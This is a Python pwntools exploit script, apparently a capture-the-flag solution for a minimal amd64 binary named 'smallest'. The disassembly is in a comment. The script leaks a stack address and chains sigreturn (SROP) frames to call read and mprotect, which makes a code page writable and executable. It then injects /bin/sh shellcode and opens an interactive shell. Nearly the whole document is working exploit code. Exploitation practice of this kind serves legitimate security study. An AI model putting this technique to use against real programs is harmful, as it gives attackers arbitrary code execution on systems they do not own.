from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['terminator','-x','bash','-c']
'''
.text:00000000004000B0 start           proc near
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h
.text:00000000004000B8                 mov     rsi, rsp
.text:00000000004000BB                 mov     rdi, rax
.text:00000000004000BE                 syscall
.text:00000000004000C0                 retn
.text:00000000004000C0 start           endp
'''
# 3 argv rdi rsi rdx 

def p(n):
	return p64(n)
def sl(n):
	return cn.sendline(n)
def s(n):
	return cn.send(n)
def r():
	return cn.recv()
def u(n):
	return u64(n)
def z():
	return raw_input()

cn = process('./smallest')
p_syscall_ret = 0x4000be
p_start = 0x4000b0
sc_adr = 0x400100
frame = SigreturnFrame(kernel = 'amd64')


pay = p(p_start) + p(0x4000bb) + p(p_start)
s(pay)
s('\xbb')
stack = u(r()[16:24]) - 0x1000
print hex(stack) #get stack

frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack
frame.rdx = 0x300
frame.rsp = stack
frame.rip = p_syscall_ret

pay = p(p_start) + p(p_syscall_ret) +str(frame)

s(pay)
s(p(p_syscall_ret) + '\x00'*7)#sigreturn 

frame.rax = constants.SYS_mprotect
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = stack
frame.rip = p_syscall_ret

pay = p(p_start) + p(p_syscall_ret) +str(frame)

s(pay)
s(p(p_syscall_ret) + '\x00'*7)#sigreturn 


frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = sc_adr
frame.rdx = 0x300
frame.rsp = stack
frame.rip = p_syscall_ret

pay = p(p_start) + p(p_syscall_ret) +str(frame)
s(pay)
s(p(p_syscall_ret) + '\x00'*7)#sigreturn
s(asm(shellcraft.amd64.sh()))
s(p(sc_adr))

cn.interactive()